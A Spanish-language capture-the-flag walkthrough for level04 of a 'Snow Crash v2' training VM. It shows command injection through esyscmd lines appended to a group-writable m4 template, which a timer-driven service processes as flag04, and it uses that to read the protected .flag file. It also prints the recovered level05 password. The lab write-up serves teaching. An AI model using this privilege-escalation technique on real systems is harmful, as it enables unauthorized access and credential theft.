# Level04 - Snow Crash v2

## Tipo de ejercicio

Inyección de comandos en una plantilla `m4` modificable por un grupo de
usuarios y procesada periódicamente con los privilegios de `flag04`.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level05`.

La versión clásica de Snow Crash utiliza un CGI de Perl en el puerto `4747`
con una vulnerabilidad de inyección de comandos. En esta OVA v2 no hay ningún
servicio escuchando en ese puerto ni existe `getflag`; el mecanismo real es el
generador de configuración `babel`.

## 1. Inspeccionar el nivel

Desde la sesión SSH de `level04`:

```bash
whoami
pwd
ls -la
cat README
```

El README contiene la pista:

```text
In the beginning was the Word.
```

El directorio personal no contiene el CGI clásico. En cambio, existe un
script de configuración:

```bash
ls -la /opt/snowcrash/level04
ls -l /opt/snowcrash/level04/babel.sh
file /opt/snowcrash/level04/babel.sh
sed -n '1,240p' /opt/snowcrash/level04/babel.sh
```

El script procesa la plantilla:

```text
/var/lib/babel/templates/template.m4
```

y genera:

```text
/var/lib/babel/output.conf
```

## 2. Analizar el servicio Babel

La configuración del servicio y de su temporizador se consulta con:

```bash
cat /etc/systemd/system/babel.service
cat /etc/systemd/system/babel.timer
```

La parte relevante del servicio es:

```ini
[Service]
Type=oneshot
User=flag04
ExecStart=/opt/snowcrash/level04/babel.sh
```

El temporizador ejecuta Babel cada 30 segundos:

```ini
OnUnitActiveSec=30s
```

Por tanto, cualquier contenido malicioso añadido a la plantilla será
procesado automáticamente con los permisos de `flag04`.

## 3. Confirmar los permisos de la plantilla

```bash
id
ls -ld /var/lib/babel/templates
ls -l /var/lib/babel/templates/template.m4
test -w /var/lib/babel/templates/template.m4 \\
	&& echo "template escribible" \\
	|| echo "template no escribible"
```

Resultado relevante:

```text
uid=1005(level04) gid=1007(level04) groups=1007(level04),987(babel),1001(levelgroup)
drwxrwxr-x 2 root babel ... /var/lib/babel/templates
-rw-rw-r-- 1 root babel ... /var/lib/babel/templates/template.m4
template escribible
```

El usuario `level04` pertenece al grupo `babel` y puede modificar
`template.m4`. La plantilla utiliza macros de `m4`, por ejemplo `define` e
`ifelse`, por lo que también permite utilizar la macro especial `esyscmd`.

## 4. Reconocer el directorio de flag04

El payload independiente de reconocimiento está disponible en
[babel-recon.m4](babel-recon.m4). Su contenido ejecuta `ls` como parte del
procesamiento de `m4` y guarda la salida en `/tmp`:

```m4
esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
```

Para introducirlo en la OVA:

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
EOF
```

Después de la siguiente ejecución del temporizador:

```bash
systemctl status babel.service --no-pager
ls -l /tmp/babel_flag04_listing.txt
cat /tmp/babel_flag04_listing.txt
```

El listado reveló el archivo protegido:

```text
-r-------- 1 flag04 flag04 26 ... .flag
```

La ruta del secreto es:

```text
/home/flag04/.flag
```

## 5. Extraer la credencial

El payload independiente de extracción está disponible en
[babel-extract.m4](babel-extract.m4). Este ejecuta `cat` como `flag04` y
guarda el resultado en un archivo temporal:

```m4
esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
```

Se añade a la plantilla de la misma forma:

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
EOF
```

Tras la siguiente ejecución de Babel:

```bash
ls -l /tmp/level04_flag.txt
cat /tmp/level04_flag.txt
```

La credencial obtenida fue:

```text
ne2searoevaevoem4ov4ar8ap
```

## 6. Conectarse a level05

Desde el equipo anfitrión, cerrar la sesión de `level04` y conectarse al
siguiente nivel:

```bash
exit
ssh level05@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
ne2searoevaevoem4ov4ar8ap
```

La conexión correcta muestra un prompt similar a:

```text
level05@snowcrash:~$
```

## Conclusión

La solución clásica basada en un CGI de Perl y el puerto `4747` no aplica a
esta OVA v2. La solución real consiste en aprovechar que `level04` pertenece
al grupo `babel` y puede modificar la plantilla `template.m4`.

El servicio `babel`, ejecutado como `flag04`, procesa esa plantilla cada 30
segundos. La macro `esyscmd` permite ejecutar comandos durante el
procesamiento, leer `/home/flag04/.flag` y guardar el contenido en un archivo
legible. La credencial obtenida para `level05` es:

```text
ne2searoevaevoem4ov4ar8ap
```
